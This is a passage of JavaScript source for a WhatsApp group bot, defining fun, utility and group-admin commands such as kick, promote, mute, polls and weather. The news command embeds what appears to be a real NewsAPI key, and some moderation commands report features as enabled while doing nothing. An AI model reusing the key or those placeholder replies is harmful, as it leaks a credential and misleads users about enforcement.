    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

hango({
  nomCom: "pick",
  aliases: ["choose", "select"],
  desc: "Pick between two choices.",
  categorie: "fun",
  reaction: '🚚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure two options are provided
  if (!text.includes(',')) {
    return repondre("❌ Please provide two choices to pick from. Example: `.pick Ice Cream, Pizza`");
  }

  try {
    // Pick a random option
    const options = text.split(',').map(option => option.trim());
    const choice = options[Math.floor(Math.random() * options.length)];

    // Send the result
    repondre(`🎉 Bot picks: *${choice}*`);
  } catch (e) {
    console.error("Error in .pick command:", e);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "timenow",
  aliases: ["currenttime", "time"],
  desc: "Check the current local time.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time in the configured timezone
    const localTime = now.toLocaleTimeString("en-US", { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true,
      timeZone: conf.TIMEZONE, // Using the configured timezone from set.js
    });
    
    // Send the local time as reply
    repondre(`🕒 Current Local Time: ${localTime}`);
  } catch (e) {
    console.error("Error in .timenow command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "date",
  aliases: ["currentdate", "todaydate"],
  desc: "Check the current date.",
  categorie: "new",
  reaction: '📆',
}, async (dest, hn, context) => {
  const { repondre } = context;

  try {
    // Get current date
    const now = new Date();
    
    // Get the formatted date (e.g., "Monday, January 15, 2025")
    const currentDate = now.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    
    // Send the current date as reply
    repondre(`📅 Current Date: ${currentDate}`);
  } catch (e) {
    console.error("Error in .date command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "calculate2",
  aliases: ["calcu", "maths", "mathema"],
  desc: "Evaluate a mathematical expression.",
  categorie: "new",
  reaction: '🧮',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure arguments are provided
  if (!text) {
    return repondre("🧮 Use this command like:\n *Example:* .calculate 5+3*2");
  }

  // Validate the input to prevent unsafe operations
  if (!/^[0-9+\-*/().\s]+$/.test(text)) {
    return repondre("❎ Invalid expression. Only numbers and +, -, *, /, ( ) are allowed.");
  }

  try {
    // Evaluate the mathematical expression
    let result = eval(text);

    // Reply with the result
    repondre(`✅ Result of "${text}" is: ${result}`);
  } catch (e) {
    console.error("Error in .calculate command:", e);
    repondre("❎ Error in calculation. Please check your expression.");
  }
});

hango({
  nomCom: "emojify",
  aliases: ["emoji", "txtemoji"],
  desc: "Convert text into emoji form.",
  categorie: "fun",
  reaction: '🙂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // If no valid text is provided
  if (!text) {
    return repondre("❌ Please provide some text to convert into emojis!");
  }

  try {
    // Map text to corresponding emoji characters
    const emojiMapping = {
      "a": "🅰️",
      "b": "🅱️",
      "c": "🇨️",
      "d": "🇩️",
      "e": "🇪️",
      "f": "🇫️",
      "g": "🇬️",
      "h": "🇭️",
      "i": "🇮️",
      "j": "🇯️",
      "k": "🇰️",
      "l": "🇱️",
      "m": "🇲️",
      "n": "🇳️",
      "o": "🅾️",
      "p": "🇵️",
      "q": "🇶️",
      "r": "🇷️",
      "s": "🇸️",
      "t": "🇹️",
      "u": "🇺️",
      "v": "🇻️",
      "w": "🇼️",
      "x": "🇽️",
      "y": "🇾️",
      "z": "🇿️",
      "0": "0️⃣",
      "1": "1️⃣",
      "2": "2️⃣",
      "3": "3️⃣",
      "4": "4️⃣",
      "5": "5️⃣",
      "6": "6️⃣",
      "7": "7️⃣",
      "8": "8️⃣",
      "9": "9️⃣",
      " ": "␣" // for space
    };

    // Convert the input text into emoji form
    const emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

    await hn.sendMessage(dest, {
      text: emojiText,
    }, { quoted: context.ms });

  } catch (e) {
    console.error("Error in .emoji command:", e);
    repondre(`❌ Error: ${e.message}`);
  }
});

hango({
  nomCom: "news2",
  aliases: ["latestnews", "newsheadlines"],
  desc: "Get the latest news headlines.",
  categorie: "AI",
  reaction: '🗞️',
}, async (dest, hn, context) => {
  const { repondre, from } = context;

  try {
    const apiKey = "0f2c43ab11324578a7b1709651736382";
    const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
    const articles = response.data.articles;

    if (!articles.length) {
      return repondre("No news articles found.");
    }

    // Send each article as a separate message with image and title
    for (let i = 0; i < Math.min(articles.length, 5); i++) {
      const article = articles[i];
      let message = `
📰 *${article.title}*
📝 _${article.description}_
🔗 _${article.url}_

> © Powered by ${conf.BOT}
      `;

      console.log('Article URL:', article.urlToImage); // Log image URL for debugging

      if (article.urlToImage) {
        // Send image with caption
        await hn.sendMessage(dest, { image: { url: article.urlToImage }, caption: message });
      } else {
        // Send text message if no image is available
        await hn.sendMessage(dest, { text: message });
      }
    }
  } catch (e) {
    console.error("Error fetching news:", e);
    repondre("Could not fetch news. Please try again later.");
  }
});

hango({
  nomCom: "groupinfo",
  aliases: ["ginfo", "infogroup"],
  desc: "Get detailed information about the current group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    
    // Count admins
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    
    // Format creation date
    const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    // Create group info message
    const infoMessage = `
📊 *GROUP INFORMATION*
📝 *Name:* ${groupMetadata.subject}
👥 *Members:* ${participants.length}
👑 *Admins:* ${adminCount}
🆔 *Group ID:* ${dest.chat}
📅 *Created On:* ${creationDate}
${groupMetadata.desc ? `📄 *Description:* ${groupMetadata.desc}` : ''}
    `;
    
    await repondre(infoMessage);
  } catch (error) {
    console.error("Error in groupinfo command:", error);
    await repondre("❌ An error occurred while fetching group information.");
  }
});

hango({
  nomCom: "tagall",
  aliases: ["mentionall", "everyone"],
  desc: "Tag all members in the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    const isAdmin = participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Attention everyone!";
    
    // Create mentions array and message
    const mentions = participants.map(p => p.id);
    let mentionText = `📢 *${message}*\n\n`;
    
    participants.forEach(participant => {
      mentionText += `@${participant.id.split('@')[0]}\n`;
    });
    
    await hn.sendMessage(dest.chat, {
      text: mentionText,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in tagall command:", error);
    await repondre("❌ An error occurred while tagging group members.");
  }
});

hango({
  nomCom: "promote",
  aliases: ["makeadmin", "admin"],
  desc: "Promote a member to admin",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to promote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is already admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ This user is already an admin.");
    }
    
    // Promote the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "promote");
    
    await repondre(`👑 User @${targetId.split('@')[0]} has been promoted to admin.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in promote command:", error);
    await repondre("❌ An error occurred while promoting the member.");
  }
});

hango({
  nomCom: "demote",
  aliases: ["removeadmin", "unadmin"],
  desc: "Demote an admin to member",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag an admin to demote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isTargetAdmin) {
      return repondre("❌ This user is not an admin.");
    }
    
    // Demote the admin
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "demote");
    
    await repondre(`👤 User @${targetId.split('@')[0]} has been demoted to member.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in demote command:", error);
    await repondre("❌ An error occurred while demoting the admin.");
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use a YouTube download service API
    const ytDlUrl = `https://loader.to/api/button/?url=${encodeURIComponent(url)}&f=mp3`;
    
    // Get video info
    const info = await ytdl.getInfo(url);
    const videoTitle = info.videoDetails.title;
    const thumbnail = info.videoDetails.thumbnails[0].url;
    
    // Send audio with thumbnail
    await hn.sendMessage(dest.chat, {
      audio: { url: ytDlUrl },
      mimetype: 'audio/mpeg',
      fileName: `${videoTitle}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: videoTitle,
          body: "YouTube MP3",
          thumbnailUrl: thumbnail,
          sourceUrl: url
        }
      }
    });
    
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    await repondre("❌ An error occurred while downloading the audio.");
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
